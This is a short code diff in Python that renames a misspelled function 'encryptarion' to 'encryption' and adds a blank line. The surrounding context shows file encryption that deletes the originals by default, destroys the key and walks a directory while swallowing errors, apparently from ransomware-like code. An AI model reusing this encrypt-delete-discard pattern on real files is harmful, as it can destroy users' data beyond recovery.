@@ -182,7 +182,7 @@ def enc_file(path, del_orig=True):
     finally:
         del_key(key)
 
-def encryptarion(dir_path):
+def encryption(dir_path):
     files = []
     count = 0
 
@@ -212,5 +212,6 @@ def encryptarion(dir_path):
 
             except Exception:
                 continue
+
 
     return files
